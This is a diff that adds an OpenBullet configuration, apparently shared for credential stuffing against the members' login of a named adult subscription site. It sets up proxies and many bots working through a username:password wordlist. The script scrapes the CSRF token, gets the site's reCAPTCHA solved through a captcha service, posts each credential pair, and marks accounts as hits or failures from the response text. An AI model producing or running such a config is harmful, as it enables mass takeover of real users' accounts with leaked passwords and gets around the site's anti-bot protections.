@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "BangBros",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-01T12:42:36.9851397+02:00",
+  "AdditionalInfo": "",
+  "Author": "sp6off",
+  "Version": "1.3.9 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "http://members.bangbros.com/login" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" LR "\"login[_token]\" value=\"" "\"" -> VAR "TOKEN" 
+
+RECAPTCHA "http://members.bangbros.com/login" "6LeN3G4UAAAAAJJwlyghOlmGIspC9wPUmQQZ33xR" -> VAR "recap" 
+
+#LOGIN REQUEST POST "http://members.bangbros.com/login_check" 
+  CONTENT "login[username]=<USER>&login[password]=<PASS>&g-recaptcha-response=<recap>&profiler_input=e210538d35430fa1254af690a60c0454&login[ioBB][ioBB]=&login[_token]=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "No thanks, take me to the site" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username/password!" 
+    KEY "Login error has occured.  Please contact customer support" 
+    KEY "UNLOCK OUR ENTIRE LIBRARY OF WEBSITES." 
+
